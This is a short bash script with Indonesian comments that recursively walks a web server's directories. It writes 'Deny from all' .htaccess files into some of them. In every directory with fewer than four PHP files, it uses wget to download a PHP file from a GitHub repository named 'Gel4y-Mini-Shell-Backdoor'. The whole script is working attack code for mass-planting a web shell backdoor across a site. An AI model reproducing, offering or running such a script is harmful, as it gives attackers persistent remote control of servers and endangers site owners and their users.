#!/bin/bash

# Fungsi untuk mengecek setiap direktori dan melakukan aksi berdasarkan izinnya
checkAndPlaceHtaccess() {
    local dirPath="$1"
    local htaccessContent="Order Deny,Allow\nDeny from all"

    # Mengecek izin dari direktori
    local permissions
    permissions=$(stat -c "%a" "$dirPath")

    # Jika izinnya adalah 0444, cetak lokasi direktori
    if [ "$permissions" = "0444" ]; then
        echo "Direktori dengan izin 0444 ditemukan: $dirPath"
    # Jika izinnya adalah 0755, coba tambahkan .htaccess jika belum ada
    elif [ "$permissions" = "0755" ]; then
        local htaccessPath="${dirPath}/.htaccess"
        if [ ! -f "$htaccessPath" ]; then
            echo -e "$htaccessContent" > "$htaccessPath"
            echo "File .htaccess ditempatkan di: $htaccessPath"
        fi
    fi
}

# Fungsi untuk menghitung jumlah file php dalam suatu direktori
countphpFiles() {
    local dirPath="$1"
    local phpFiles=$(find "$dirPath" -maxdepth 1 -type f -iname "*.php" | wc -l)
    echo "$phpFiles"
}

# Fungsi rekursif untuk menelusuri direktori
recurseDirectories() {
    local currentDir="$1"
    # Loop melalui setiap item dalam direktori
    for item in "$currentDir"/*; do
        if [ -d "$item" ]; then
            # Jika item adalah direktori, cek dan tempatkan .htaccess jika perlu
            checkAndPlaceHtaccess "$item"

            # Cek jumlah file php dalam direktori
            local phpCount
            phpCount=$(countphpFiles "$item")

            # Jika jumlah file php kurang dari 4, download file php ke direktori
            if [ "$phpCount" -lt 4 ]; then
                local phpUrl="https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php" # Ganti dengan URL php yang sebenarnya
                local targetFile="${item}/$(basename "$phpUrl")"
                wget -q -O "$targetFile" "$phpUrl" && echo "File php terunduh ke: $targetFile"
            fi

            # Rekursi ke dalam direktori
            recurseDirectories "$item"
        fi
    done
}

# Mulai dari direktori skrip ini berada atau direktori yang diberikan
startDir=${1:-$(pwd)}

# Panggil fungsi utama dengan direktori awal
recurseDirectories "$startDir"
